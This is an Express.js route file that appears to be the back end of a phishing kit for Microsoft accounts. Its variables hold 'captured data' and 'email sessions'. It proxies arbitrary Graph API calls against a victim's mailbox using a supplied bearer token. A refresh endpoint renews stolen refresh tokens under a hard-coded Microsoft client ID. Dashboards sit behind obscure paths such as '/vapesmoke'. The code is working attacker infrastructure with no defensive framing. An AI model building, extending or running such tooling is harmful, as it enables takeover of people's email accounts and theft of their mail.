// routes/dashboard.js
const express = require('express');
const router = express.Router();
const axios = require('axios');
const path = require('path');

// Store dependencies
let capturedData = null;
let emailSessions = null;

// Initialize function
function initRoutes(dependencies) {
    capturedData = dependencies.capturedData;
    emailSessions = dependencies.emailSessions;
    
    // Store in app locals for access in routes
    router.use((req, res, next) => {
        req.app.locals.capturedData = capturedData;
        req.app.locals.emailSessions = emailSessions;
        next();
    });
    
    console.log('✅ Dashboard routes initialized with data stores');
}

// ============= PROXY ENDPOINT =============
router.options('/api/outlook-proxy', (req, res) => {
    const origin = process.env.APP_URL || 'http://localhost:3001';
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE, PATCH');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.sendStatus(200);
});

router.post('/api/outlook-proxy', express.json(), async (req, res) => {
    const origin = process.env.APP_URL || 'http://localhost:3001';
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE, PATCH');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    let { outlookPath, method, data, queryParams } = req.body;
    
    console.log('=' .repeat(60));
    console.log(`📥 PROXY REQUEST RECEIVED`);
    console.log(`   Method: ${method || 'GET'}`);
    console.log(`   Original target: ${outlookPath}`);
    
    // Build proper Graph API URL
    let targetUrl = outlookPath;
    
    // Handle relative paths
    if (outlookPath && !outlookPath.startsWith('http')) {
        const cleanPath = outlookPath.replace(/^\//, '');
        targetUrl = `https://graph.microsoft.com/v1.0/me/${cleanPath}`;
        console.log(`   Converted to Graph API: ${targetUrl}`);
    }
    
    // Convert old Outlook API to Graph
    if (targetUrl && targetUrl.includes('outlook.office.com/api/v2.0')) {
        targetUrl = targetUrl
            .replace('https://outlook.office.com/api/v2.0/me', 'https://graph.microsoft.com/v1.0/me')
            .replace('/mailfolders/', '/mailFolders/');
        console.log(`   Converted Outlook API to Graph: ${targetUrl}`);
    }
    
    console.log(`   Final target URL: ${targetUrl}`);
    console.log(`   Auth header present: ${!!req.headers.authorization}`);
    
    if (!targetUrl) {
        return res.status(400).json({ error: 'No target URL specified' });
    }
    
    const authHeader = req.headers.authorization;
    if (!authHeader) {
        return res.status(401).json({ error: 'No authorization token provided' });
    }
    
    try {
        const forwardHeaders = {
            'Authorization': authHeader,
            'Accept': 'application/json',
            'User-Agent': 'Outlook-Graph-Proxy/1.0'
        };
        
        if (data && (method === 'POST' || method === 'PATCH' || method === 'PUT')) {
            forwardHeaders['Content-Type'] = 'application/json';
        }
        
        const response = await axios({
            method: method || 'GET',
            url: targetUrl,
            data: data,
            headers: forwardHeaders,
            params: queryParams,
            timeout: 30000,
            validateStatus: () => true
        });
        
        console.log(`✅ Graph API responded with status: ${response.status}`);
        res.status(response.status).json(response.data);
        
    } catch (error) {
        console.error(`❌ PROXY ERROR: ${error.message}`);
        
        if (error.response?.status === 401) {
            console.error(`   ⚠️ Token is invalid or expired`);
            return res.status(401).json({
                error: "Invalid or expired token",
                details: "Please refresh your token and try again"
            });
        }
        
        res.status(error.response?.status || 500).json({
            error: error.message,
            details: error.response?.data
        });
    }
});

// ============= TOKEN REFRESH ENDPOINT =============
router.post('/api/refresh-token', express.json(), async (req, res) => {
    const origin = process.env.APP_URL || 'http://localhost:3001';
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    const { refreshToken, clientId } = req.body;
    
    if (!refreshToken) {
        return res.status(400).json({ error: "No refresh token provided" });
    }
    
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams({
                client_id: clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                refresh_token: refreshToken,
                grant_type: 'refresh_token',
                scope: 'https://graph.microsoft.com/.default offline_access'
            }).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }
        );
        
        console.log(`✅ Token refreshed successfully`);
        res.json(response.data);
        
    } catch (error) {
        console.error('❌ Token refresh failed:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json(error.response?.data || { error: error.message });
    }
});

// ============= TEST ENDPOINT =============
router.get('/api/test-proxy', (req, res) => {
    res.json({ 
        status: 'ok', 
        message: 'Proxy endpoint is reachable',
        timestamp: new Date().toISOString()
    });
});


// ============= DASHBOARD HTML ENDPOINTS =============
router.get('/token-manager', (req, res) => {
  res.sendFile(path.join(__dirname, '../html/token-manager.html'));
});

router.get('/vapesmoke', (req, res) => {
  res.sendFile(path.join(__dirname, '../html/outlook-dashboard.html'));
});

router.get('/yuing', (req, res) => {
  res.sendFile(path.join(__dirname, '../html/outlook-dashboard.html'));
});

// ============= HEALTH ENDPOINT =============
router.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: Date.now(),
        uptime: process.uptime()
    });
});

// Export both the router and the init function
module.exports = { 
    router,
    initRoutes 
};